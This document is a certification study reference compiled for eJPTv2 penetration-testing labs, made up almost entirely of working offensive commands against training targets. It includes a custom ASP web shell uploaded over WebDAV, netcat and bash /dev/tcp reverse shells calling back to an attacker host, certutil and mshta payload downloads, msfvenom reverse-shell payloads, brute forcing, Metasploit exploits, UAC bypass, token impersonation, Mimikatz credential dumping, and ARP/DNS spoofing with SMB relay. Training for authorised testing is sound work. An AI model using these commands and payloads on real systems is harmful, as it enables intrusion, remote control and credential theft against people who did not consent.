# eJPTv2 — Master Lab Reference

**Compiled by Dr. Mohammed Tawfik**

Every lab worked through or studied, organized by service/technique. Commands are working examples — adjust IPs/hostnames per session. Target is usually `demo.ine.local`.

---

# PART A — RECONNAISSANCE & SCANNING

## A1. Host Discovery & Port Scanning

```bash
# Reachability
ping -c 4 demo.ine.local

# Host discovery (skip if ICMP blocked)
nmap -sn 10.0.0.0/24

# When ICMP is blocked and host shows as "down" — FORCE the scan
nmap -Pn demo.ine.local

# Standard service-version scan
nmap -sV demo.ine.local
nmap -sS -sV -O demo.ine.local

# Full TCP port scan (catches services on odd ports!)
nmap -sS -p- --min-rate 1000 demo.ine.local

# Specific port + version
nmap -Pn -sV -p 80 demo.ine.local

# UDP scan (SNMP, DNS, etc.)
nmap -sU -p 161 demo.ine.local
nmap -sU --top-ports 25 demo.ine.local

# Confirm a "filtered" port (firewall present)
nmap -Pn -p 443 demo.ine.local
```

**Port states:** open = listening | closed = reachable, nothing there | filtered = firewall dropping probes | open|filtered = UDP undetermined.

## A2. Banner Grabbing

```bash
ifconfig                                   # find your IP/interface
nmap -sV -O <target>
nmap -sV --script=banner <target>
nc <target> 22                             # raw banner
nc -nv <target> 80
```

## A3. Nmap Enumeration Scripts

```bash
# HTTP directory discovery
nmap --script http-enum -sV -p 80 demo.ine.local

# SMB scripts
nmap -p445 --script smb-protocols demo.ine.local
nmap -p445 --script smb-security-mode demo.ine.local
nmap -p445 --script smb-os-discovery.nse demo.ine.local
nmap -p445 --script smb-enum-users.nse demo.ine.local
nmap -p445 --script smb-enum-shares demo.ine.local

# SNMP
nmap -sU -p 161 --script=snmp-brute demo.ine.local
nmap -sU -p 161 --script "snmp-*" demo.ine.local

# Vuln scanning
nmap -sV --script vuln demo.ine.local
ls -al /usr/share/nmap/scripts | grep vuln
```

## A4. Vulnerability Scanning — Shellshock example

```bash
nmap -sV -O 192.152.25.3
nmap -sV -p 80 --script=http-shellshock \
  --script-args "http-shellshock.uri=/gettime.cgi" 192.152.25.3
```

---

# PART B — SERVICE ENUMERATION & EXPLOITATION

## B1. FTP (port 21, or non-default like 5554)

```bash
# Version + scripts
nmap -sV -sC -p 21 demo.ine.local

# Anonymous login
ftp demo.ine.local                         # try anonymous/anonymous
ftp demo.ine.local 5554                    # non-default port

# searchsploit for the version
searchsploit vsftpd
searchsploit proftpd 1.3.5

# MSF version + brute + anon check
msfconsole -q
use auxiliary/scanner/ftp/ftp_version
set RHOSTS demo.ine.local
run

use auxiliary/scanner/ftp/ftp_login
set RHOSTS demo.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
run

use auxiliary/scanner/ftp/anonymous
set RHOSTS demo.ine.local
run

# Hydra brute (FTP works fine, unlike SMB)
hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt \
      -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt \
      demo.ine.local ftp
# Non-default port:
hydra -L users.txt -P pass.txt -s 5554 ftp://demo.ine.local
```

### vsftpd 2.3.4 backdoor
```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS demo.ine.local
run                          # patched versions fail — fall back to brute
```

**LAB FACT:** ProFTPD 1.3.5a → brute found `sysadmin:654321`. FTP banner can leak weak-password users.

## B2. SMB / Samba (ports 139, 445)

```bash
# Recon
nmap -sV -p 139,445 demo.ine.local
nmap -p445 --script smb-protocols demo.ine.local
nmap -p445 --script smb-os-discovery.nse demo.ine.local

# Share listing (null session)
smbclient -L //demo.ine.local -N
smbclient -L //demo.ine.local -U guest

# Full enumeration
enum4linux -a demo.ine.local
enum4linux -U demo.ine.local        # users
enum4linux -S demo.ine.local        # shares
enum4linux -r demo.ine.local        # RID cycling (finds users when other methods fail)

# When enum4linux/smbclient fail → rpcclient
rpcclient -U "" -N demo.ine.local
# inside rpcclient:
srvinfo
enumdomusers
netshareenumall          # ← shows HIDDEN shares (browseable=no)
querydominfo
exit

# Share permissions at a glance
smbmap -H demo.ine.local -u guest -p ''
smbmap -H demo.ine.local -u <user> -p <pass>

# NetBIOS name
nmblookup -A demo.ine.local

# Connect to a share
smbclient //demo.ine.local/<share> -N
smbclient //demo.ine.local/<share> -U <user>
# inside: ls / recurse ON / prompt OFF / mget * / get file / exit

# One-shot download (non-interactive)
smbclient //demo.ine.local/<share> -U user%pass -c 'recurse ON; prompt OFF; mget *'
```

### SMB login brute (USE THIS, not Hydra — Hydra only does SMBv1)
```bash
msfconsole -q
use auxiliary/scanner/smb/smb_login
set RHOSTS demo.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
run

# Single user, one-liner
msfconsole -q -x "use auxiliary/scanner/smb/smb_login; set RHOSTS demo.ine.local; set SMBUser alice; set PASS_FILE /root/Desktop/wordlists/unix_passwords.txt; set VERBOSE false; set STOP_ON_SUCCESS true; run; exit"
```

### Brute-force hidden share names
```bash
while read share; do
  result=$(smbclient //demo.ine.local/"$share" -N -c 'ls' 2>&1 | head -3)
  if ! echo "$result" | grep -q "BAD_NETWORK_NAME"; then
    echo "=== $share ==="; echo "$result"; echo ""
  fi
done < /root/Desktop/wordlists/shares.txt
```

### Samba usermap_script (Samba 3.0.20)
```bash
use exploit/multi/samba/usermap_script
set RHOSTS demo.ine.local
exploit                      # → root shell, no payload needed
```

### Windows SMB → psexec (with valid creds)
```bash
use exploit/windows/smb/psexec
set RHOSTS demo.ine.local
set SMBUser Administrator
set SMBPass <password>
exploit                      # → meterpreter
```

**LAB FACTS:**
- Samba skill check: anonymous share `pubfiles` (found via shares.txt), `josh:purple` private share, FTP banner leaked weak-pw users, SSH banner held a flag.
- error codes: `BAD_NETWORK_NAME` = no such share | `ACCESS_DENIED` = exists, needs auth | `smb: \>` prompt = anonymous worked.

## B3. HTTP / Apache (port 80)

```bash
# Headers + methods
curl -I http://demo.ine.local/
curl -X OPTIONS http://demo.ine.local/ -v          # look for PUT/DAV
curl http://demo.ine.local/robots.txt

# Directory brute
gobuster dir -u http://demo.ine.local -w /usr/share/wordlists/dirb/common.txt
dirb http://demo.ine.local
ffuf -u http://demo.ine.local/FUZZ -w wordlist.txt -fc 404

# MSF HTTP auxiliary modules (Apache enum lab — all 10)
msfconsole -q
use auxiliary/scanner/http/http_version            ; set RHOSTS victim-1 ; run
use auxiliary/scanner/http/robots_txt              ; set RHOSTS victim-1 ; run
use auxiliary/scanner/http/http_header             ; set RHOSTS victim-1 ; run
use auxiliary/scanner/http/brute_dirs              ; set RHOSTS victim-1 ; run
use auxiliary/scanner/http/dir_scanner             ; set RHOSTS victim-1 ; set DICTIONARY /usr/share/metasploit-framework/data/wordlists/directory.txt ; run
use auxiliary/scanner/http/dir_listing             ; set RHOSTS victim-1 ; set PATH /data ; run
use auxiliary/scanner/http/files_dir               ; set RHOSTS victim-1 ; set VERBOSE false ; run
use auxiliary/scanner/http/http_put                ; set RHOSTS victim-1 ; set PATH /data ; set FILENAME test.txt ; set FILEDATA "test" ; run
use auxiliary/scanner/http/http_login              ; set RHOSTS victim-1 ; set AUTH_URI /secure/ ; set VERBOSE false ; run
use auxiliary/scanner/http/apache_userdir_enum     ; set RHOSTS victim-1 ; set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt ; set VERBOSE false ; run

# Verify PUT upload / DELETE
wget http://victim-1:80/data/test.txt ; cat test.txt
# (set ACTION DELETE ; run  to remove)

# CMS
whatweb http://demo.ine.local
wpscan --url http://demo.ine.local --enumerate u,t,p
```

## B4. WebDAV (IIS, port 80)

```bash
# Detect WebDAV — look for "DAV:" header & PUT/MOVE/COPY in OPTIONS
curl -X OPTIONS http://demo.ine.local/webdav/ -v -u bob:password_123321

# Enumerate accepted/executable extensions
davtest -url http://demo.ine.local/webdav
davtest -auth bob:password_123321 -url http://demo.ine.local/webdav

# --- METHOD 1: MSF (try first) ---
msfconsole -q
use exploit/windows/iis/iis_webdav_upload_asp
set RHOSTS demo.ine.local
set HttpUsername bob
set HttpPassword password_123321
set PATH /webdav/metasploit%RAND%.asp
exploit
# → meterpreter ; shell ; cd / ; dir ; type flag.txt

# --- METHOD 2: Manual (when MSF/old shells fail) ---
# Custom ASP shell that actually renders output:
cat > /tmp/shell.asp << 'EOF'
<%
sCmd = Request.QueryString("cmd")
If sCmd <> "" Then
  Set oShell = Server.CreateObject("WScript.Shell")
  Set oExec = oShell.Exec("cmd.exe /c " & sCmd)
  Response.Write "<pre>" & Server.HTMLEncode(oExec.StdOut.ReadAll()) & "</pre>"
End If
%>
<form method="GET"><input name="cmd" size="80"><input type="submit" value="Run"></form>
EOF

# Upload via WebDAV PUT
curl -u bob:password_123321 -T /tmp/shell.asp http://demo.ine.local/webdav/shell.asp
curl -u bob:password_123321 -I http://demo.ine.local/webdav/shell.asp   # expect 200

# Run commands (note: endpoint needs auth too!)
curl -u bob:password_123321 -G --data-urlencode "cmd=whoami" http://demo.ine.local/webdav/shell.asp
curl -u bob:password_123321 -G --data-urlencode "cmd=dir /s /b C:\flag*" http://demo.ine.local/webdav/shell.asp
curl -u bob:password_123321 -G --data-urlencode "cmd=type C:\flag.txt" http://demo.ine.local/webdav/shell.asp
```

**LAB FACT:** `/usr/share/webshells/asp/cmdasp.asp` runs but doesn't render output on modern IIS — use the custom shell above. Flag was at `C:\flag.txt`.

## B5. SSH (port 22)

```bash
nmap -sS -sV demo.ine.local
nc demo.ine.local 22                       # banner

# Brute force
use auxiliary/scanner/ssh/ssh_login
set RHOSTS demo.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
set STOP_ON_SUCCESS true
set VERBOSE true
exploit
# then: sessions -i 1 ; find / -name "flag" ; cat /flag

# libssh auth bypass (CVE-2018-10933) — no password needed!
use auxiliary/scanner/ssh/libssh_auth_bypass
set RHOSTS demo.ine.local
set SPAWN_PTY true
exploit
sessions -i 1

# Hydra (works for SSH)
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://demo.ine.local -t 4

# Crack a key with passphrase
ssh2john id_rsa > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**LAB FACTS:** OpenSSH 7.9p1 → `ssh_login` found `sysadmin:hailey`, flag at `/flag`. SSH login banners can contain flags (check `/etc/issue.net`).

## B6. SMTP / Postfix (port 25)

```bash
nmap -sV -script banner demo.ine.local

# Manual user enumeration via VRFY
nc demo.ine.local 25
VRFY admin@openmailbox.xyz          # 252 = exists, 550 = no
VRFY commander@openmailbox.xyz

# Capabilities
telnet demo.ine.local 25
HELO attacker.xyz
EHLO attacker.xyz

# Automated user enum
smtp-user-enum -M VRFY -U /usr/share/commix/src/txt/usernames.txt -t demo.ine.local

use auxiliary/scanner/smtp/smtp_enum
set RHOSTS demo.ine.local
exploit

# Send fake mail (telnet)
telnet demo.ine.local 25
HELO attacker.xyz
mail from: admin@attacker.xyz
rcpt to: root@openmailbox.xyz
data
Subject: Hi Root
body text
.

# Send fake mail (sendemail)
sendemail -f admin@attacker.xyz -t root@openmailbox.xyz -s demo.ine.local \
  -u Fakemail -m "fake message" -o tls=no
```

## B7. MySQL (port 3306)

```bash
nmap demo.ine.local                        # confirm 3306

use auxiliary/scanner/mysql/mysql_version  ; set RHOSTS demo.ine.local ; run
use auxiliary/scanner/mysql/mysql_login    ; set RHOSTS demo.ine.local ; set USERNAME root ; set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt ; set VERBOSE false ; run
use auxiliary/admin/mysql/mysql_enum       ; set USERNAME root ; set PASSWORD twinkle ; set RHOSTS demo.ine.local ; run
use auxiliary/admin/mysql/mysql_sql        ; set USERNAME root ; set PASSWORD twinkle ; set RHOSTS demo.ine.local ; run
use auxiliary/scanner/mysql/mysql_hashdump ; set USERNAME root ; set PASSWORD twinkle ; set RHOSTS demo.ine.local ; run
use auxiliary/scanner/mysql/mysql_schemadump ; set USERNAME root ; set PASSWORD twinkle ; set RHOSTS demo.ine.local ; run
use auxiliary/scanner/mysql/mysql_file_enum  ; set USERNAME root ; set PASSWORD twinkle ; set FILE_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt ; set RHOSTS demo.ine.local ; run
use auxiliary/scanner/mysql/mysql_writable_dirs ; set USERNAME root ; set PASSWORD twinkle ; set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt ; set RHOSTS demo.ine.local ; run

# Direct connection
mysql -u root -p -h demo.ine.local
# SHOW DATABASES; USE x; SHOW TABLES; SELECT user,password FROM mysql.user;
```

**LAB FACT:** root:twinkle → MySQL 5.5.61. hashdump pulled all account hashes; schemadump revealed databases.

## B8. SNMP (port 161/udp)

```bash
nmap -sU -p 161 demo.ine.local
nmap -sU -p 161 --script=snmp-brute demo.ine.local
snmpwalk -v 1 -c public demo.ine.local
snmpwalk -v 2c -c public demo.ine.local
nmap -sU -p 161 --script "snmp-*" demo.ine.local > snmp_output
# Then use discovered info (users) to brute SMB/RDP/etc.
```

## B9. RDP (port 3389, or non-default like 3333)

```bash
nmap -sV demo.ine.local                    # find the RDP port

# Confirm a non-default port is RDP
use auxiliary/scanner/rdp/rdp_scanner
set RHOSTS demo.ine.local
set RPORT 3333
exploit

# Brute force (non-default port with -s)
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt \
      -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt \
      rdp://demo.ine.local -s 3333

# Connect
xfreerdp /u:administrator /p:qwertyuiop /v:demo.ine.local:3333
xfreerdp /u:administrator /p:qwertyuiop /v:demo.ine.local:3333 /cert:ignore   # cert errors
```

**LAB FACT:** RDP on 3333 (not 3389). Flag was the port number itself.

## B10. WinRM (port 5985)

```bash
nmap --top-ports 7000 demo.ine.local       # find 5985 wsman

use auxiliary/scanner/winrm/winrm_login
set RHOSTS demo.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
exploit

use auxiliary/scanner/winrm/winrm_cmd
set RHOSTS demo.ine.local
set USERNAME administrator
set PASSWORD tinkerbell
set CMD whoami
exploit

use exploit/windows/winrm/winrm_script_exec
set RHOSTS demo.ine.local
set USERNAME administrator
set PASSWORD tinkerbell
set FORCE_VBS true
exploit
# → cd / ; dir ; cat flag.txt

# Alternative: evil-winrm
evil-winrm -i demo.ine.local -u administrator -p tinkerbell
```

---

# PART C — EXPLOITATION & SHELLS

## C1. searchsploit + fixing public exploits

```bash
searchsploit "HTTP File Server 2.3"
searchsploit -m 39161               # copy to cwd
vim 39161.py                        # fix LHOST/LPORT/target
searchsploit -x 39161               # examine
cp /usr/share/windows-resources/binaries/nc.exe /root/Desktop/
python -m SimpleHTTPServer 80       # host nc.exe
nc -nvlp 1234                       # listener
python 39161.py demo.ine.local 80   # run
```

## C2. Rejetto HFS 2.3 (port 80)

```bash
nmap -sV -p 80 demo.ine.local       # HttpFileServer httpd 2.3
searchsploit hfs
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS demo.ine.local
set LHOST <your_ip>
exploit                             # → meterpreter
```

## C3. Bind & Reverse Shells (netcat)

```bash
# Transfer nc.exe to Windows target
cd /usr/share/windows-binaries
python -m SimpleHTTPServer 80
# on Windows:
certutil -urlcache -f http://<Kali_IP>/nc.exe nc.exe

# BIND shell (target listens, attacker connects)
nc.exe -nvlp 1234 -e cmd.exe        # Windows
nc -nv <target> 1234                # Kali

# REVERSE shell (attacker listens, target connects)
nc -nvlp 1234                       # Kali
nc.exe -nv <Kali_IP> 1234 -e cmd.exe  # Windows
# Linux target: nc <Kali_IP> 1234 -e /bin/bash

# Bash reverse one-liner (Linux)
bash -i >& /dev/tcp/<Kali_IP>/1234 0>&1

# File transfer with nc
nc.exe -nvlp 1234 > received.txt    # receiver
nc -nv <target> 1234 < send.txt     # sender
```

## C4. Upgrade dumb shell to full TTY

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
# Enter twice
```

## C5. msfvenom payloads

```bash
# Windows EXE
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f exe > backdoor.exe
# ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f asp -o shell.asp
# Linux ELF
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f elf -o shell.elf
# PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f raw -o shell.php

# Multi-handler to catch it
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <ip>
set LPORT 4444
exploit -j
```

---

# PART D — POST-EXPLOITATION & PRIVILEGE ESCALATION

## D1. Basic post-ex (meterpreter)

```bash
getuid
sysinfo
getsystem                # auto-privesc attempt
hashdump                 # SAM hashes (needs SYSTEM)
ps                       # process list
migrate <PID>            # move to stable process
shell                    # drop to cmd
search -f flag.txt       # find files
```

## D2. Windows privesc — getsystem / token impersonation (incognito)

```bash
# When getsystem fails, try token theft
load incognito
list_tokens -u
impersonate_token ATTACKDEFENSE\\Administrator
getuid                   # confirm elevation
cat C:\\Users\\Administrator\\Desktop\\flag.txt
```

## D3. Windows privesc — UAC bypass (UACMe)

```bash
# After foothold (e.g. HFS), migrate to a medium-integrity process
ps -S explorer.exe
migrate <PID>
getsystem                # may fail under UAC

# Generate payload + upload UACMe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f exe > backdoor.exe
cd C:\\Users\\admin\\AppData\\Local\\Temp
upload /root/Desktop/tools/UACME/Akagi64.exe .
upload /root/backdoor.exe .

# Second terminal: handler (see C5)
# Trigger via UACMe method 23
shell
Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe

# In elevated session
ps -S lsass.exe
migrate <lsass_PID>
hashdump
```

## D4. Windows privesc — Unattend.xml credentials

```bash
# PowerUp audit (PowerSploit)
powershell -ep bypass
. .\PowerUp.ps1
Invoke-PrivescAudit
cat C:\Windows\Panther\Unattend.xml

# Decode base64 password
$password='QWRtaW5AMTIz'
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($password))
# → Admin@123

runas.exe /user:administrator cmd   # enter decoded password

# HTA delivery for shell
# Kali:
use exploit/windows/misc/hta_server
exploit
# Target:
mshta.exe http://<kali>:8080/<random>.hta
```

## D5. Credential dumping — Kiwi/Mimikatz

```bash
migrate -N lsass.exe
load kiwi
creds_all
lsa_dump_sam
lsa_dump_secrets

# Crack dumped NTLM
hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt
john --format=NT ntlm.txt --wordlist=rockyou.txt
```

## D6. Linux privesc quick checks

```bash
sudo -l                              # check GTFOBins for listed binaries
find / -perm -4000 2>/dev/null       # SUID binaries
getcap -r / 2>/dev/null              # capabilities
crontab -l ; cat /etc/crontab        # cron jobs
cat /etc/passwd ; cat /etc/shadow    # if readable
# Automated:
./linpeas.sh
```

---

# PART E — PIVOTING & LATERAL MOVEMENT

## E1. Metasploit autoroute (preferred — stable)

```bash
# After getting a session, find the second network
shell
ip addr                              # note 2nd interface, e.g. 192.180.108.2

# Add route through the session
run autoroute -s 192.180.108.0/24
# or:
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 192.180.108.0
run

# Scan the pivoted network (routes through session automatically)
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.180.108.3
set PORTS 1-1000
set VERBOSE false
exploit
```

## E2. SOCKS proxy + proxychains (for external tools)

```bash
use auxiliary/server/socks_proxy
set SRVPORT 9050
set VERSION 4a                       # or 5
exploit -j
jobs

# Edit /etc/proxychains4.conf — add: socks4 127.0.0.1 9050
proxychains nmap demo1.ine.local -sT -Pn -sV -p 445
proxychains curl http://192.180.108.3
```

## E3. Port forwarding (single port)

```bash
portfwd add -l 8080 -p 80 -r 192.180.108.3
# Now localhost:8080 → target:80
portfwd list
```

## E4. Pivot to SMB shares on second host

```bash
sessions -i 1
shell
net view 10.0.28.125
migrate -N explorer.exe
net use D: \\10.0.28.125\Documents
net use K: \\10.0.28.125\K$
dir D:
cat D:\FLAG2.txt
```

## E5. Static binary + bash scanner (no nmap on pivot host)

```bash
# Upload static nmap + custom bash scanner
upload /root/static-binaries/nmap /tmp/nmap
upload /root/bash-port-scanner.sh /tmp/bash-port-scanner.sh
shell
cd /tmp/
chmod +x ./nmap ./bash-port-scanner.sh
./bash-port-scanner.sh 192.180.108.3
./nmap -p- 192.180.108.3
```

bash-port-scanner.sh:
```bash
#!/bin/bash
for port in {1..1000}; do
  timeout 1 bash -c "echo >/dev/tcp/$1/$port" 2>/dev/null && echo "port $port is open"
done
```

**LAB FACT (T1046 / XODA pivot):** XODA file-upload → meterpreter → `ip addr` shows 192.180.108.2 → autoroute /24 → portscan finds 192.180.108.3 open 21/22/80.

---

# PART F — NETWORK ATTACKS

## F1. SMB Relay + ARP/DNS spoof (MitM)

```bash
# Metasploit relay
use exploit/windows/smb/smb_relay
set SRVHOST 172.16.5.101
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 172.16.5.101
set SMBHOST 172.16.5.10
exploit

# DNS spoof
echo "172.16.5.101 *.sportsfoo.com" > dns
dnsspoof -i eth1 -f dns

# ARP spoof (two terminals, enable forwarding first)
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth1 -t 172.16.5.5 172.16.5.1
arpspoof -i eth1 -t 172.16.5.1 172.16.5.5
```

## F2. Responder (LLMNR/NBT-NS poisoning)

```bash
sudo responder -I eth0 -A
# captured hashes → /usr/share/responder/logs/
john --format=netntlmv2 <hashfile> --wordlist=rockyou.txt
```

---

# PART G — PASSWORD CRACKING

```bash
# Identify
hashid '<hash>'

# Hashcat modes: 0=MD5 100=SHA1 1400=SHA256 1000=NTLM 1800=sha512crypt 5600=NetNTLMv2
hashcat -a 0 -m 0 hash.txt /usr/share/wordlists/rockyou.txt
hashcat -a 0 -m 1000 ntlm.txt rockyou.txt --potfile-disable

# John
john --format=raw-md5 --wordlist=rockyou.txt hash.txt
john --format=NT --wordlist=rockyou.txt ntlm.txt
john --show hash.txt

# Linux shadow
unshadow /etc/passwd /etc/shadow > combined.txt
john --wordlist=rockyou.txt combined.txt

# Convert formats
ssh2john id_rsa > rsa.hash
zip2john file.zip > zip.hash
```

---

# APPENDIX — Lab → Technique Map

| Lab | Service | Technique | Key command |
|-----|---------|-----------|-------------|
| Nmap -Pn | firewalled | force scan | `nmap -Pn` |
| XODA pivot | HTTP | file upload + autoroute | `xoda_file_upload`, `run autoroute` |
| FTP enum | FTP | brute + anon | `ftp_login`, `ftp_version` |
| Samba recon | SMB | null session enum | `enum4linux -a`, `smbclient -L -N` |
| Samba skillcheck | SMB | hidden shares + brute | shares.txt loop, `smb_login` |
| Apache enum | HTTP | MSF http modules | 10x `http_*` modules |
| MySQL enum | MySQL | login + dump | `mysql_login`, `mysql_hashdump` |
| SSH login | SSH | brute | `ssh_login` |
| Vulnerable SSH | SSH | libssh bypass | `libssh_auth_bypass` |
| Postfix recon | SMTP | VRFY enum | `smtp-user-enum`, `smtp_enum` |
| NetBIOS hacking | SMB | psexec + pivot | `psexec`, `socks_proxy` |
| SNMP analysis | SNMP | community string | `snmpwalk -c public` |
| DNS/SMB relay | network | MitM | `smb_relay`, `arpspoof` |
| Banner grab | any | nc/nmap banner | `nc <t> 22` |
| Nmap vuln scan | HTTP | shellshock script | `--script=http-shellshock` |
| Fixing exploits | HTTP | searchsploit + edit | `searchsploit -m 39161` |
| Bind/reverse shells | any | netcat | `nc -nvlp`, `nc -e` |
| vsftpd | FTP | backdoor / brute | `vsftpd_234_backdoor` |
| Samba usermap | SMB | usermap_script | `usermap_script` |
| WebDAV (Win) | IIS | ASP upload | `iis_webdav_upload_asp` / manual |
| SMB psexec (Win) | SMB | brute + psexec | `smb_login` + `psexec` |
| Insecure RDP (Win) | RDP | non-default port brute | `rdp_scanner` + Hydra + xfreerdp |
| WinRM (Win) | WinRM | script_exec | `winrm_script_exec FORCE_VBS` |
| UAC Bypass (Win) | HFS | UACMe method 23 | `Akagi64.exe 23 <payload>` |
| Impersonate (Win) | HFS | incognito tokens | `impersonate_token` |
| Unattend.xml (Win) | privesc | answer-file creds | `Invoke-PrivescAudit` |
| Kiwi (Win) | BadBlue | mimikatz dump | `load kiwi; creds_all` |
